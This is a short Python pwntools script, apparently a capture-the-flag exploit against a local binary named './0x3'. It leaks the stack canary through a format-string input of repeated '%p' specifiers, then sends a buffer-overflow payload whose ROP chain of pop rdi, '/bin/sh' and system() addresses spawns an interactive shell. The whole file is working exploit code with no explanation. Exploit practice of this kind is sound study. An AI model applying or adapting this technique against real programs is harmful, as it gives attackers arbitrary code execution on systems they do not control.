from pwn import *

context.update(arch="amd64", os="linux")
context.binary = ELF("./0x3")
p = process("./0x3")

p.recvuntil(b"\n")
p.sendline(b"%p %p %p %p %p %p %p %p %p %p %p %p %p")
cookie = p.recvline().split()[12][:-1]
info(f"Leaked cookie: {cookie.decode()}")

payload  = b"A"*56              # answer + name
payload += p64(int(cookie, 16)) # cookie
payload += b"A"*8               # rbp
payload += p64(0x7ffff7dff265)  # pop rdi; ret
payload += p64(0x7ffff7f72e28)  # /bin/sh
payload += p64(0x7ffff7dff266)  # ret
payload += p64(0x7ffff7e26c30)  # system()

p.sendline(payload)
p.interactive()
